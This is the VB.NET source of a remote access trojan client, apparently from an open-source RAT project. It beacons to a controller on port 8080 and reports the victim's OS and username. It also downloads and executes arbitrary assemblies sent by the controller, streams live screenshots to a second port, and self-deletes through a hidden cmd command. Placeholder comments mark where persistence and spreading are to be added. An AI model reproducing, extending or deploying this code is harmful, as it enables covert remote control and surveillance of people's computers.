Imports System.Diagnostics
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports System
Imports System.Drawing
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Principal
Imports System.IO
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class C
    Public Shared Sub Check()

        Dim b As Byte() = System.Text.Encoding.UTF8.GetBytes("")
        While True

            Thread.Sleep(1000)

            Try

                CLI.GetStream.Write(b, 0, b.Length)

            Catch ex As Exception

                Try
                    CLI = New TcpClient

                    CLI.Connect("127.0.0.1", 8080)

                    Dim hjk As New Thread(Sub() T(CLI.GetStream))
                    hjk.Start()
                Catch esqx As Exception

                End Try


            End Try

        End While
    End Sub

    Public Shared CLI As TcpClient
    Public Shared p As StringBuilder

    ''

    Public Shared Sub Main()

        ''ADD PERMISSION
        ''ADD STARTUP
        ''ADD SPREAD


     





        Try
            CLI = New TcpClient

            CLI.Connect("127.0.0.1", 8080)

            If CLI.Connected = True Then

                Dim hjk As New Thread(Sub() T(CLI.GetStream))
                hjk.Start()



            End If

        Catch ex As Exception

            While CLI.Connected = False


                Try
                    CLI = New TcpClient

                    CLI.Connect("127.0.0.1", 8080)

                    Dim hjk As New Thread(Sub() T(CLI.GetStream))

                    hjk.Start()

                Catch exs As Exception

                End Try
            End While
        End Try
        Dim zeo As New Thread(Sub() Check())
        zeo.Start()


    End Sub


    Public Shared Async Sub T(ByVal l As NetworkStream)


        p = New StringBuilder

        Try
            Dim b(150 * 4096) As Byte


            While True


                Dim lu As Integer = l.Read(b, 0, b.Length)
                If (lu > 0) Then


                    Try
                        Dim Message As String = Encoding.Default.GetString(b, 0, lu)


                        p.Append(Message)


                        If p.ToString.EndsWith("|GETID|") Then
                            Dim aze As New Microsoft.VisualBasic.Devices.Computer
                            Dim ks As String = aze.Info.OSFullName & "|IDD|" & Environment.UserName & "|IDD|" & aze.Info.OSVersion & "|IDDEND|"

                            CLI.GetStream.Write(System.Text.Encoding.UTF8.GetBytes(ks), 0, System.Text.Encoding.UTF8.GetBytes(ks).Length)

                            p.Clear()

                        ElseIf p.ToString.EndsWith("|ENDING|") Then

                            Dim j As String = p.ToString.Replace("|ENDING|", "")

                            p.Clear()

                            '            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"
                            Dim j2 As String() = Microsoft.VisualBasic.Strings.Split(j, "|SP1|")


                            Dim az As New Thread(Sub() Launch(CLI, j2(0), j2(1)))
                            az.Start()
                            '  Task.Run(Sub() Launch(CLI, j2(0), j2(1)))



                            GC.Collect()
                            GC.WaitForPendingFinalizers()
                            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)


                        ElseIf p.ToString = "|CLOSETHISSHIT|" Then



                            Microsoft.VisualBasic.Interaction.Shell("cmd.exe /c ping 0 -n 2 & del " & """" & Application.ExecutablePath & """", Microsoft.VisualBasic.AppWinStyle.Hide, False, -1)
                            NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)


                        ElseIf p.ToString = "|CLOSEONLY|" Then
                            NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)
                            ' Environment.Exit(0)


                        ElseIf p.ToString.EndsWith("|SRDV|") Then


                            p.Clear()

                            TcpV = New TcpClient

                            TcpV.Connect("127.0.0.1", 1800)



                            ViewerDesk = New Thread(AddressOf CamCam)

                            ViewerDesk.Start()

                        ElseIf p.ToString.EndsWith("|TRDV|") Then

                            p.Clear()

                            Try
                                ViewerDesk.Abort()
                            Catch ex As Exception

                            End Try
                        End If


                    Catch ex As Exception

                    End Try



                Else

                End If
                GC.Collect()
                GC.WaitForPendingFinalizers()
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            End While
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub

    Public Shared TcpV As TcpClient
    Public Shared ViewerDesk As Thread
    Public Shared ns As NetworkStream

    <DllImport("user32.dll")>
    Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean

    End Function


    <StructLayout(LayoutKind.Sequential)>
    Structure CURSORINFOHELPER
        Public cbSize As Int32
        Public flags As Int32
        Public hCursor As IntPtr
        Public ptScreenPos As Point
    End Structure

    <DllImport("user32.dll")>
    Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean

    End Function


    Public Shared Function Desk() As Image
        Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
        Dim iamage As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)

        Dim graphics As Graphics = Graphics.FromImage(iamage)
        Dim upperLeftSource As New Point(0, 0)
        Dim upperLeftDestination As New Point(0, 0)
        graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)

        ''this code is always the same to get "screenshot" but it doesn't include cursor so I made a way to get it !

        Dim gaz As New Point

        Dim WB = GetCursorPos(gaz)




        Dim hj As New CURSORINFOHELPER

        hj.cbSize = Marshal.SizeOf(hj)
        GetCursorInfo(hj)

        If hj.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message

            '
            graphics.DrawIcon(Icon.FromHandle(hj.hCursor), gaz.X, gaz.Y)
        End If


        Return iamage
    End Function


    Public Shared Sub CamCam()
        Dim bf As New BinaryFormatter
        While True

            ns = TcpV.GetStream

            bf.Serialize(ns, Desk)


            GC.Collect()
            GC.WaitForPendingFinalizers()


            Thread.Sleep(1)

            '
            GC.Collect()
            GC.WaitForPendingFinalizers()

        End While
    End Sub























    Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal mp As String, Optional ByVal P As String = "")

        Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(Encoding.Default.GetBytes(mp))

        Dim method As System.Reflection.MethodInfo = assemblytoload.[GetType]("PL.MainCL").GetMethod("ST")


        Dim obj As Object = assemblytoload.CreateInstance(method.Name)



        '   
        Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))



        assemblytoload = Nothing
        method = Nothing
        GC.Collect()
        GC.WaitForPendingFinalizers()
        SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
    End Sub

    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

    <DllImport("ntdll.dll")>
    Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
    End Function
End Class
